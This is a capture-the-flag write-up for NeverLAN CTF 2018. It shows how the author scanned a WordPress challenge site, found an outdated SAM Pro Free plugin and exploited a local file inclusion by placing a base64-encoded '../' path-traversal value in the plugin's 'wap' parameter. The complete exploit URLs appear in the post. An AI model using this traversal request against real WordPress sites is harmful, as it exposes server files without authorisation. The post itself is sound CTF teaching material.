---
layout: post
title: NeverLAN CTF 2018 - What The LFI ?
image: "/assets/img/2018/neverlanctf2018/whatthelfi/1.png"
categories: [general, neverlanctf2018]
tags: [neverlanctf2018, writeup]
twitter_text: "Write-up for What The LFI ?"
introduction: "Write-up for What The LFI ?"
description: "Write-up for What The LFI ?"
---


![](/assets/img/2018/neverlanctf2018/whatthelfi/1.png)

![](/assets/img/2018/neverlanctf2018/whatthelfi/2.png)

So the website is a wordpress and we are searching for a LFI. First thing I search for links where the LFI could be :

[http://54.201.224.15:14099/?p=1](http://54.201.224.15:14099/?p=1)

[http://54.201.224.15:14099/?cat=1](http://54.201.224.15:14099/?cat=1)

[http://54.201.224.15:14099/?s=test](http://54.201.224.15:14099/?s=test)

And I try basic LFI like this :

[http://54.201.224.15:14099/?p=/var/www/blah.php](http://54.201.224.15:14099/?p=/var/www/blah.php)

[http://54.201.224.15:14099/?p=http://google.fr](http://54.201.224.15:14099/?p=http://google.fr)

We are just redirect, on the index page. Our LFI might not be here, let’s try a wpscan since it’s a wordpress. Command :

```
wpscan 54.201.224.15:14099
```

Result :

![](/assets/img/2018/neverlanctf2018/whatthelfi/3.png)

Interesting there is a plugin not up to date, and there is the LFI.

The scan gives us the location and some reference. Let’s check the reference. We have a Proof of Concept in this one :

[Link](https://www.pluginvulnerabilities.com/2016/10/28/local-file-inclusion-lfi-vulnerability-in-sam-pro-free-edition/)

We can see that the link “wap” is base64, so let’s base64 our path :

```
/var/www/blah.php → L3Zhci93d3cvYmxhaC5waHAK
```

[http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/](http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/)

Url :

[http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php?action=NA&wap=L3Zhci93d3cvYmxhaC5waHAK](http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php?action=NA&wap=L3Zhci93d3cvYmxhaC5waHAK)

Result :

![](/assets/img/2018/neverlanctf2018/whatthelfi/4.png)

It’s not working because we are in the wrong directory, let’s change it by :

```
../../../../blah.php → Li4vLi4vLi4vLi4vYmxhaC5waHA=
```

Final url :

[http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php?action=NA&wap=Li4vLi4vLi4vLi4vYmxhaC5waHA=](http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php?action=NA&wap=Li4vLi4vLi4vLi4vYmxhaC5waHA=)

> The flag : ```flag{dont_include_files_derived_from_user_input_kthx_bai}```